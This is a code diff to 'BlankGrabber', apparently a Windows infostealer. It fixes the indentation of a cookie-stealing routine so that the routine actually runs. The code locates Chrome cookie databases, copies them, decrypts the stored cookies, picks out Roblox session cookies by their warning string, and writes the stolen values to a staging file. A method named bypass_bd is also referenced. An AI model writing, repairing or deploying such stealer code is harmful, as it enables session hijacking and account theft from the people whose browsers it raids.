@@ -194,41 +194,41 @@ class BlankGrabber:
                 self.OK = True
 
     def getcookie(self):
-        cookiepath = subprocess.run('where /r . "cookies"', capture_output= True, shell= True, cwd= self.chromefolder).stdout.decode().splitlines()
+        cookiepath = subprocess.run('where /r . cookies', capture_output= True, shell= True, cwd= self.chromefolder).stdout.decode().splitlines()
         for filename in cookiepath:
             if os.stat(filename).st_size==0:
                 continue
-                data = []
-                cookiedb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
-                cookiedc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Cookies')+'\\Chrome Cookies.txt'
-                try:
-                    self.copy(filename, cookiedb)
-                except Exception as e:
-                    self.logs(e, sys.exc_info())
-                    continue
-                connection = sqlite3.connect(cookiedb)
-                cursor = connection.cursor()
-                table = cursor.execute("SELECT host_key, name, encrypted_value from cookies").fetchall()
-                if len(table)==0:
-                    continue
-                else:
-                    self.copy(cookiedb, os.path.join(os.path.dirname(cookiedc), os.path.basename(filename)))
-                for row in table:
-                    url = row[0]
-                    name = row[1]
-                    cookie = row[2]
-                    if (url and name and cookie):
-                        cookie = self.decrypt_data(cookie)
-                        if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in cookie:
-                            self.roblocookie.append(cookie)
-                        data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nName: {name}\nCookie: {cookie}")
-                cursor.close()
-                connection.close()
-                if len(data)!= 0:
-                    with open(cookiedc, 'wt') as file:
-                        file.write("\n\n".join(data))
-                    del data
-                    self.OK = True
+            data = []
+            cookiedb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
+            cookiedc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Cookies')+'\\Chrome Cookies.txt'
+            try:
+                self.copy(filename, cookiedb)
+            except Exception as e:
+                self.logs(e, sys.exc_info())
+                continue
+            connection = sqlite3.connect(cookiedb)
+            cursor = connection.cursor()
+            table = cursor.execute("SELECT host_key, name, encrypted_value from cookies").fetchall()
+            if len(table)==0:
+                continue
+            else:
+                self.copy(cookiedb, os.path.join(os.path.dirname(cookiedc), os.path.basename(filename)))
+            for row in table:
+                url = row[0]
+                name = row[1]
+                cookie = row[2]
+                if (url and name and cookie):
+                    cookie = self.decrypt_data(cookie)
+                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in cookie:
+                        self.roblocookie.append(cookie)
+                    data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nName: {name}\nCookie: {cookie}")
+            cursor.close()
+            connection.close()
+            if len(data)!= 0:
+                with open(cookiedc, 'wt') as file:
+                    file.write("\n\n".join(data))
+                del data
+                self.OK = True
 
     def bypass_bd(self):
         try:
